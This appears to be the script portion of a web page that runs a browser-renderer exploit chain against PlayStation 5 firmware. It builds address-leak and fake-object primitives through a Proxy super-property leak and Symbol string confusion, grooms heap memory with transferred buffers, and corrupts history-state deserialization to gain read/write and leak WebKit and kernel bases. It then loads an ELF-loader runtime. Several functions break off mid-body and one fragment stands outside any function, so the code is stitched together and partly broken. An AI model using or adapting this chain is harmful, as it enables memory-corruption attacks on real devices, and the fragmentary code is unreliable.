function readBytes(destination, source, count) {
    for (let i = 0; i < count; ++i)
        destination[i] = source[i];
}

function sameBytes(left, right, count) {
    for (let i = 0; i < count; ++i) {
        if (left[i] !== right[i])
            return false;
    }
    return true;
}

function readTwiceMatches(destination, source, count) {
    readBytes(destination, source, count);
    return sameBytes(destination, source, count);
}

// Accept only identical, allocation-free collator snapshot pairs.
function readStableCollatorSnapshot(source) {
    for (let round = 1; round <= COLLATOR_STABLE_READ_ROUNDS; ++round) {
        readBytes(collatorHeader, source, COLLATOR_BYTES);
        readBytes(collatorHeaderRepeat, source, COLLATOR_BYTES);
        if (sameBytes(collatorHeader, collatorHeaderRepeat, COLLATOR_BYTES))
            return true;
    }
    return false;
}

function aimCarrier(candidate, address) {
    const high = Math.floor(address / 0x100000000);
    scratchWords[0] = address - high * 0x100000000;
    scratchWords[1] = high;
    for (let i = 0; i < 8; ++i)
        candidate[RENDERER_LAYOUT.vectorOffset + i] = scratchBytes[i];
}

function restoreCarrier(candidate) {
    for (let i = 0; i < 8; ++i)
        candidate[RENDERER_LAYOUT.vectorOffset + i]
            = rwHeader[RENDERER_LAYOUT.vectorOffset + i];
}

function pointerFromWords(words, offset) {
    if (words[offset + 3] !== 0)
        return NaN;
    return words[offset]
        + words[offset + 1] * 0x10000
        + words[offset + 2] * 0x100000000;
}

function plausibleCell(value) {
    return value > 0x100000000
        && value <= 0xffffffffffff
        && value <= 9007199254740991
        && Math.floor(value) === value
        && value % 8 === 0;
}

function plausibleAddress(value) {
    return value > 0x100000000
        && value <= 0xffffffffffff
        && value <= 9007199254740991
        && Math.floor(value) === value;
}

function canonicalLow48(bytes, offset) {
    return bytes[offset + 6] === 0 && bytes[offset + 7] === 0;
}

function inPS5UserModuleBand(value) {
    return value >= 0x800000000 && value < 0x900000000;
}

function encodedHeaderNumber() {
    const raw = new ArrayBuffer(8);
    const u32 = new Uint32Array(raw);
    const f64 = new Float64Array(raw);
    const uint8 = RENDERER_OBJECTS.uint8Array;
    const targetHigh = RENDERER_BOOTSTRAP.indexingType
        + uint8.cellType * 0x100 + uint8.typeFlags * 0x10000
        + RENDERER_BOOTSTRAP.cellState * 0x1000000;
    u32[0] = RENDERER_BOOTSTRAP.uint8ArrayStructureId;
    u32[1] = targetHigh - RENDERER_ENCODING.jsValueDoubleEncodeHigh32;
    return f64[0];
}

function scheduleSafeRetry(reason) {
    if (retryScheduled || stopped)
        return;
    const candidateStateSafe = !candidateEverReturned
        || (zeroHeaderMiss && !candidateMutationStarted);
    if (retrySafe && candidateStateSafe && !candidateMutationStarted
        && !carrierReady && !runtimeStarted)
        releaseSafeAttemptMemory();
    hardStop(`single attempt failed: ${reason}`);
}

function releaseGroomingMemoryForRuntime() {

function startAttempt() {
    if (stopped)
        return;
    rendererAttemptStarted = true;
    try {
        const qualification = preloadedProfile?.qualificationRecord?.() || {};
        Slopkit.Attempts?.begin({
            attemptId: Q.get("arm"),
            exploit: SELECTED_EXPLOIT,
            firmware: FW_LABEL,
            profileRevision: qualification.profileRevision
                || `offsets-v${preloadedProfile?.metadata?.schemaVersion || 0}`,
            engineRevision: qualification.engineRevision || "current",
            runtimeRevision: qualification.runtimeRevision
                || RUNTIME_REVISION_FALLBACK,
            mode: "default"
        });
    } catch {}
    mark("ATTEMPT-START");
    resetAttemptState();
    showStatus("", "run");
    try {
        buildAndStoreGraph();
        prepareAddrof();
    } catch {
        finishEarlySafeAttempt("setup-threw");
    }
}

function leakScopeObject() {
    class Leaker { leak() { return super.foo; } }
    Leaker.prototype.__proto__ = new Proxy({}, {
        get: function (target, property, receiver) { return receiver; }
    });
    const leak = Leaker.prototype.leak;
    return (function () { return leak(); })();
}

function prepareSymbolWrapper(F) {
    leakedScope = leakScopeObject();
    if (leakedScope === undefined || leakedScope === null)
        throw new Error("scope-not-leaked");

    for (let i = 0; i < 512; i++)
        leakedScope[`p${i}`] = i;
    for (let j = 0; j < 8; j++)
        leakedScope[j] = 1.1 * j;

    Object.defineProperty(leakedScope, "g", { get: F, configurable: true });
    return Object(leakedScope.g);
}

function buildFakeHost() {
    rwBuffer = new ArrayBuffer(0x100);
    rwView = new Uint8Array(rwBuffer);
    rwMirror = new Uint8Array(rwBuffer);
    rwMirror[0] = 0x3c;

    targetBuffer = new ArrayBuffer(FUNCTION_BYTES);
    targetView = new Uint8Array(targetBuffer);
    targetView[0] = 0xa5;
    lengthWord = { keep: 0x51515151 };

    fakeHost = {
        q0: encodedHeaderNumber(),
        q1: 1.1,
        q2: rwView,
        q3: lengthWord,
        q4: 2.2,
        q5: 3.3
    };

    delete fakeHost.q1;
    delete fakeHost.q4;
    delete fakeHost.q5;

    if (!Number.isFinite(fakeHost.q0) || fakeHost.q2 !== rwView
        || fakeHost.q3 !== lengthWord || rwView[0] !== 0x3c
        || targetView[0] !== 0xa5 || typeof nativeTarget !== "function")
        throw new Error("fake-host-shape-failed");

    arenaBuffer = new ArrayBuffer(ARENA_BYTES);
    arenaView = new Uint8Array(arenaBuffer);
    arenaView[0xf00] = 0x52;
    arenaView[0xf01] = 0x4f;
    arenaView[0xf02] = 0x50;
    arenaView[0xf03] = 0x31;
    realCollator = new Intl.Collator("en", { usage: "search" });
    compareFn = realCollator.compare;
    if (!(compareFn("a", "b") < 0))
        throw new Error("collator-prewarm-failed");
    holderGuardA = { marker: 0x484f4c44 };
    holderGuardB = { marker: 0x47554152 };
    targetHolder = {
        q0: nativeTarget,
        q1: arenaView,
        q2: realCollator,
        q3: compareFn,
        q4: holderGuardA,
        q5: holderGuardB
    };

    if (arenaView.length !== ARENA_BYTES || arenaView[0xf00] !== 0x52
        || targetHolder.q0 !== nativeTarget || targetHolder.q1 !== arenaView
        || targetHolder.q2 !== realCollator || targetHolder.q3 !== compareFn
        || targetHolder.q4 !== holderGuardA || targetHolder.q5 !== holderGuardB
        || typeof compareFn !== "function")
        throw new Error("notify-holder-shape-failed");
}

function buildAndStoreGraph() {
    mark("SSV-BUILD");
    referenceTarget = { marker: 0x51515151, kind: "serialized-reference" };
    buildFakeHost();

    fillerGraph = new Array(0xfffd);
    let pos = 0;
    const huge = 1n << 40n;
    for (let b = 0; b < FILLER_BIGINTS; ++b)
        fillerGraph[pos++] = huge + BigInt(b);
    for (let o = 0; o < FILLER_OBJECTS; ++o)
        fillerGraph[pos++] = {};

    outerGraph = new Array(CONTROL_INDEX + 1);
    outerGraph[0] = fillerGraph;
    outerGraph[1] = referenceTarget;
    outerGraph[2] = referenceTarget;
    outerGraph[CONTROL_INDEX] = CONTROL_INT;

    history.replaceState(outerGraph, "");
    mark("SSV-STORED");
}

function prepareAddrof() {
    mark("ADDROF-PREP-BEGIN");
    capturedWords = new Uint16Array(16);
    getterCarrier = function getterCarrierFunction() { return 7; };

    getterCarrier[0] = fakeHost;
    for (let i = 1; i < CARRIER_SLOTS; i++)
        getterCarrier[i] = 0;
    getterCarrier[1] = targetHolder;
    getterCarrier[2] = fakeHost;
    getterCarrier[3] = targetHolder;

    preparedSymbolObject = prepareSymbolWrapper(getterCarrier);

    setTimeout(runAddrofCapture, CAPTURE_DELAY_MS);
    setTimeout(beginComposition, COMPOSE_DELAY_MS);
}

function runAddrofCapture() {
    try {
        capturedString = symbolToString.call(preparedSymbolObject);
        copiedLength = capturedString.length;
        for (let i = 0; i < 16; i++)
            capturedWords[i] = capturedString.charCodeAt(7 + i);
        captureState = 1;
    } catch {
        captureState = -1;
    }
}

function fillRawCellPointers(backing, pointer) {
    const pointerHigh = Math.floor(pointer / 0x100000000);
    const pointerLow = pointer - pointerHigh * 0x100000000;

    if (!plausibleCell(pointer)
        || pointerHigh < 0 || pointerHigh > 0xffff
        || Math.floor(pointerLow) !== pointerLow
        || pointerLow < 0 || pointerLow > 0xffffffff
        || pointerLow + pointerHigh * 0x100000000 !== pointer)
        throw new Error("invalid-low48-fake-address");

    const words = new Uint32Array(backing);
    predecessorWords.push(words);
    for (let i = 0; i < words.length; i += 2) {
        words[i] = pointerLow;
        words[i + 1] = pointerHigh;
    }

    const last = words.length - 2;
    if (words[0] !== pointerLow || words[1] !== pointerHigh
        || words[last] !== pointerLow || words[last + 1] !== pointerHigh)
        throw new Error("pointer-fill-verification-failed");
}

function clearPredecessor() {
    if (predecessorWords !== null)
        for (const words of predecessorWords) words.fill(0);
}

function loadHistoryCritical() {
    let result = null;
    let candidate = null;
    let rwHeaderCaptured = false;
    let rwVectorTouched = false;
    try {
        result = history.state;
        compositionLength = result.length;

        if (compositionLength !== EXPECTED_LENGTH) {
            result[DUPLICATE_INDEX] = undefined;
            result = null;
            clearPredecessor();
            retrySafe = true;
            compositionState = 3;
            return;
        }

        if (result[1] === result[DUPLICATE_INDEX]) {
            result[DUPLICATE_INDEX] = undefined;
            candidate = null;
            result = null;
            clearPredecessor();
            retrySafe = true;
            compositionState = 2;
            return;
        }

        candidate = result[DUPLICATE_INDEX];
        candidateEverReturned = true;

function launchRuntime() {
    if (runtimeStarted) return;
    if (!persistentCarrier || !rwView || !Slopkit?.Runtime) {
        hardStop("runtime handoff is incomplete");
        return;
    }
    if (!preloadedProfile) {
        hardStop("runtime exploit profile was not preloaded");
        return;
    }
    if (!runtimeExtensionCarrierPassed) {
        if (Slopkit.ElfLoaderJitLifecycle?.installed) {
            hardStop("JIT lifecycle extension state is untrusted");
            return;
        }
        if (runtimeExtensionLoading) return;
        runtimeExtensionLoading = true;
        mark("RUNTIME-EXTENSION-LOAD-BEGIN");
        const script = document.createElement("script");
        script.src = "src/elf-loader-jit.js";
        script.onload = function () {
            mark("RUNTIME-EXTENSION-LOAD-DONE");
            runtimeExtensionLoading = false;
            if (!Slopkit.ElfLoaderJitLifecycle?.installed) {
                hardStop("JIT lifecycle extension initialization failed");
                return;
            }
            if (!probeRuntimeCarrier()) {
                hardStop("runtime carrier probe failed after extension load");
                return;
            }
            runtimeExtensionCarrierPassed = true;
            launchRuntime();
        };
        script.onerror = function () {
            runtimeExtensionLoading = false;
            hardStop("JIT lifecycle extension load failed");
        };
        document.head.appendChild(script);
        return;
    }
    mark("RUNTIME-LAUNCH");
    runtimeStarted = true;
    stopped = true;
    setCaption(t("runtime.caption", { firmware: FW_LABEL }));
    setStageBanner(t("runtime.stage.preparing"), "");
    showStatus("", "run");
    Slopkit.Runtime.bootstrap({
        firmware: FW_LABEL,
        exploit: SELECTED_EXPLOIT,
        p2jbBurnWorkers: 3,
        mode: RUN_MODE,
        revision: REVISION,
        rendererPlacementPairs: PLACEMENT_PAIRS,
        runtimeExtension: {
            version: Slopkit.ElfLoaderJitLifecycle.version,
            installed: true,
            postLoadCarrierProbe: runtimeExtensionCarrierPassed
        },
        profile: preloadedProfile,
        armToken: Q.get("arm"),
        carrier: persistentCarrier,
        rwView,
        aimCarrier,
        restoreCarrier,
        originalVector: rwOriginalVector,
        webkitBase,
        kernelBase,
        libcBase: REFERENCE_ATTESTATION ? libcBase : undefined,
        arenaView,
        arenaBase: arenaBacking,
        collatorAddress: realCollatorAddress,
        originalCollator: collatorOriginal,
        compare: compareFn,
        translate: t,
        showStatus,
        showPostExploitActions,
        setCaption,
        catState,
        setStageBanner,
        mark,
        setDiagnosticsQuiet
    }).catch(function (error) {
        hardStop(error?.message || "full chain failed",
            error?.recoveryDisposition);
    });
}

                const actual = low48At(rwView, 0);
                const canonical = rwView[6] === 0 && rwView[7] === 0;
                if (!canonical || actual !== expected) passed = false;
            }
        } else {
            const address = webkitBase
                + preloadedProfile.offset("webkit.imports.getpid.slot");
            const expected = kernelBase
                + preloadedProfile.offset("webkit.imports.getpid.export");
            aimCarrier(persistentCarrier, address);
            const actual = low48At(rwView, 0);
            const canonical = rwView[6] === 0 && rwView[7] === 0;
            if (!canonical || actual !== expected) passed = false;
        }
    } finally {
        aimCarrier(persistentCarrier, realCollatorAddress
            + RENDERER_OBJECTS.intlCollator.collatorOffset);
    }
    return passed;
}

function rendererProfileQueryMismatch(profile) {
    const expected = profile.rendererQuery();
    for (const key of ["go", "fw", "mode", "schema", "hc", "gd",
        "notify", "gps", "gpe", "cls", "cle", "ers", "ere", "wts",
        "nts", "att", "kis", "kie", "lis", "lie", "wcl", "rc"]) {
        if (Q.get(key) !== expected.get(key))
            return key;
    }
    if (Slopkit.Profile.encodeRendererContract(profile.rendererContract())
        !== RENDERER_CONTRACT_QUERY)
        return "rc-canonical";
    return "";
}

function preloadRuntimeProfile() {
    setStageBanner(t("runtime.stage.preparing"), "");
    showStatus("", "run");
    if (!VALID_EXPLOITS.has(SELECTED_EXPLOIT)) {
        hardStop("invalid exploit selection");
        return;
    }
    if (ARM_CONTEXT_ERROR) {
        hardStop(ARM_CONTEXT_ERROR);
        return;
    }
    Slopkit.Profile.loadForExploit(OFFSETS_URL, FW_LABEL, RUN_MODE,
        SELECTED_EXPLOIT).then(function (profile) {
        verifyArmContextProfile(profile);
        const mismatch = rendererProfileQueryMismatch(profile);
        if (mismatch)
            throw new Error(`renderer query disagrees with profile: ${mismatch}`);
        preloadedProfile = profile;
        const record = profile.qualificationRecord?.() || {};
        startAttempt();
    }).catch(function (error) {
        hardStop("runtime exploit profile preload failed: "
            + (error?.message || "unknown profile error"));
    });
}

function reportComposition() {
    mark("REPORT-COMPOSITION", `state=${compositionState}`
        + ` rwOK=${rwHeaderOK} holderOK=${holderHeaderOK}`
        + ` fnOK=${functionHeaderOK} nativeOK=${nativeExecutableHeaderOK}`
        + ` wkOK=${webkitBaseOK} kernOK=${kernelBaseOK}`
        + ` libcOK=${!REFERENCE_ATTESTATION || libcBaseOK}`
        + ` handoff=${handoffReady} carrier=${carrierReady}`);
    if (compositionState < 0) {
        if (!retrySafe) {
            try { sessionStorage.setItem(blockKey, "1"); } catch {}
            failed("renderer placement failed");
        } else {
            scheduleSafeRetry("placement-throw");
        }
        return;
    }

    if (compositionState === 2) {
        scheduleSafeRetry("normal-clone-miss");
        return;
    }

    if (compositionState === 3) {
        if (!retrySafe) {
            try { sessionStorage.setItem(blockKey, "1"); } catch {}
            failed("renderer validation failed");
        } else {
            scheduleSafeRetry(zeroHeaderMiss
                ? "zero-header-miss" : "composition-length-mismatch");
        }
        return;
    }

    if (compositionState === 0) {
        failed();
        return;
    }

    const leakPass = rwHeaderOK && holderHeaderOK && functionHeaderOK
        && nativeExecutableHeaderOK && webkitBaseOK
        && pointersRepeated && restoreObserved
        && gotReadOK && kernelBaseOK
        && (!REFERENCE_ATTESTATION || libcBaseOK)
        && arenaViewHeaderOK && arenaBackingRepeated
        && collatorHeaderOK && compareFnHeaderOK
        && notifyAddressOK
        && notifyEntryAddress === kernelBase + NOTIFY_OFFSET
        && compositionLength === EXPECTED_LENGTH;
    try {
        sessionStorage.setItem(blockKey, "1");
        attemptBlocked = sessionStorage.getItem(blockKey) === "1";
    } catch {
        attemptBlocked = false;
    }

    if (leakPass && handoffReady && carrierReady && attemptBlocked) {
        if (!probeRuntimeCarrier()) {
            hardStop("runtime carrier probe failed");
            return;
        }
        releaseGroomingMemoryForRuntime();
        setTimeout(launchRuntime, 250);
        return;
    }

    failed(!collatorHeaderOK
        ? "collator layout validation failed"
        : "native handoff validation failed");
}

function runGroomAndLoad() {
    try {
        const channel = new MessageChannel();
        channel.port1.close();
        channel.port2.close();

        for (let i = 0; i < DRAIN_COUNT; ++i)
            keepAlive[keepIndex++] = buffer(DRAIN_SIZE);

        let slab = buffer(SLAB_SIZE);
        channel.port1.postMessage(0, [slab]);
        slab = null;

        const butterflyHole1 = buffer(BUTTERFLY_HOLE_SIZE);
        const butterflyHole2 = buffer(BUTTERFLY_HOLE_SIZE);
        const separator = buffer(SEPARATOR_SIZE);
        const earlyHole = buffer(EARLY_HOLE_SIZE);
        const guard = buffer(GUARD_SIZE);
        keepAlive[keepIndex++] = separator;
        keepAlive[keepIndex++] = guard;
        const finalHoles = [];
        for (let i = 0; i < PLACEMENT_PAIRS; ++i) {
            const predecessor = buffer(PREDECESSOR_SIZE);
            fillRawCellPointers(predecessor, fakeAddress);
            keepAlive[keepIndex++] = predecessor;
            finalHoles.push(buffer(FINAL_HOLE_SIZE));
        }

        channel.port1.postMessage(0, [butterflyHole1, butterflyHole2,
            earlyHole].concat(finalHoles));
        loadHistoryCritical();
    } catch {
        try { clearPredecessor(); } catch {}
        retrySafe = true;
        compositionState = -1;
    }
    reportComposition();
}

function beginComposition() {
    mark("COMPOSITION-BEGIN", `captureState=${captureState}`);
    if (captureState === 0) {
        finishEarlySafeAttempt("addrof-no-result");
        return;
    }
    if (captureState < 0) {
        finishEarlySafeAttempt("addrof-threw");
        return;
    }

    const a0 = pointerFromWords(capturedWords, 0);
    const b0 = pointerFromWords(capturedWords, 4);
    const a1 = pointerFromWords(capturedWords, 8);
    const b1 = pointerFromWords(capturedWords, 12);
    const repeated = a0 === a1 && b0 === b1;
    const distinct = a0 !== b0;
    const plausible = plausibleCell(a0) && plausibleCell(b0)
        && plausibleCell(a1) && plausibleCell(b1);
    const fakeChars = copiedLength >= 8 ? copiedLength - 8 : 0;
    const sourceCovered = fakeChars * 2 <= CARRIER_BYTES;


    if (!(repeated && distinct && plausible && sourceCovered)) {
        finishEarlySafeAttempt("addrof-validation");
        return;
    }

    hostAddress = a0;
    targetAddress = b0;
    targetAddressHigh = Math.floor(targetAddress / 0x100000000);
    targetAddressLow = targetAddress - targetAddressHigh * 0x100000000;
    if (targetAddressHigh < 0 || targetAddressHigh > 0xffff
        || targetAddressLow < 0 || targetAddressLow > 0xffffffff
        || Math.floor(targetAddressLow) !== targetAddressLow
        || targetAddressLow + targetAddressHigh * 0x100000000 !== targetAddress) {
        finishEarlySafeAttempt("target-address");
        return;
    }
    const fakeOffset = RENDERER_OBJECTS.plainObject.inlineStorageOffset;
    fakeAddress = hostAddress + fakeOffset;
    if (!plausibleCell(fakeAddress)
        || fakeAddress - hostAddress !== fakeOffset) {
        finishEarlySafeAttempt("fake-address");
        return;
    }
    runGroomAndLoad();
}

function initializeRuntimePage() {
    I18n.apply(document);
    primePostExploitActions();
    setCaption(t("runtime.caption", { firmware: FW_LABEL }));
    if (I18n.lastLoadError)
        mark("LOCALE-LOAD-FAILED", String(I18n.lastLoadError.message)
            .slice(0, 256));

    if (armed) {
        catState("run");
        document.documentElement.dataset.rendererState = "armed";
    } else {
        try { document.getElementById("cat").className = "run"; } catch {}
    }

    if (COMPLETE_PREVIEW) {
        stopped = true;
        try {
            var completePreviewCat = document.getElementById("cat");
            completePreviewCat.src = IMG_IDLE;
            completePreviewCat.className = "run";
        } catch {}
        setStageBanner(t("runtime.stage.complete"), "ok complete");
        showStatus("", "ok");
        document.documentElement.dataset.rendererState =
            "preview-complete-ready";
    } else if (POST_ACTION_PREVIEW) {
        stopped = true;
        try {
            var previewCat = document.getElementById("cat");
            previewCat.src = IMG_IDLE;
            previewCat.className = "run";
        } catch {}
        setStageBanner(t("runtime.stage.preview"), "");
        showStatus(t("runtime.status.preview"), "run");
        document.documentElement.dataset.rendererState = "preview-ready";
    } else if (!armed) {
        stopped = true;
        try {
            var idleCat = document.getElementById("cat");
            idleCat.src = IMG_IDLE;
            idleCat.className = "run";
        } catch {}
        setStageBanner("", "");
        showStatus(t("runtime.status.openLauncher"), "run");
        document.documentElement.dataset.rendererState = "unarmed-ready";
    } else if (RENDERER_CONTRACT_ERROR) {
        hardStop("renderer contract query rejected; return to the launcher");
    } else if (RUN_MODE !== "elf-loader") {
        hardStop("renderer mode rejected; return to the launcher");
    } else if (!singleAttemptPolicy) {
        hardStop("single-attempt renderer policy mismatch; return to the launcher");
    } else if (!NATIVE_TEXT_SIZE_QUERY_VALID) {
        hardStop("native text size query rejected; return to the launcher");
    } else if (typeof BigInt !== "function"
        || typeof MessageChannel !== "function"
        || typeof Symbol !== "function" || typeof history === "undefined"
        || typeof history.replaceState !== "function") {
        stopped = true;
        catState("bad");
        setStageBanner(t("runtime.stage.stopped"), "bad");
        showStatus(t("runtime.status.browserUnsupported"), "bad");
    } else {
        let runClaimed = false;
        let reentry = false;
        if (!validRunToken) {
            hardStop("missing or invalid run token; reopen the launcher");
        } else {
            try {
                reentry = sessionStorage.getItem(runKey) !== null;
                if (!reentry) {
                    sessionStorage.setItem(runKey, navigationID);
                    runClaimed = sessionStorage.getItem(runKey) === navigationID;
                }
            } catch { runClaimed = false; }
            if (reentry) {
                hardStop("renderer reload blocked; return to the launcher");
            } else if (!runClaimed) {
                hardStop("run-token persistence unavailable");
            }
        }
        if (!stopped && alreadyBlocked) {
            hardStop("renderer attempt already recorded; reboot and return to the launcher");
        }
        if (!stopped) {
            mark("ARMED-INIT", `fw=${FW_LABEL} mode=${RUN_MODE}`);
            preloadRuntimeProfile();
        }
    }
}

localeReady.then(initializeRuntimePage);
</script>
</body>
</html>
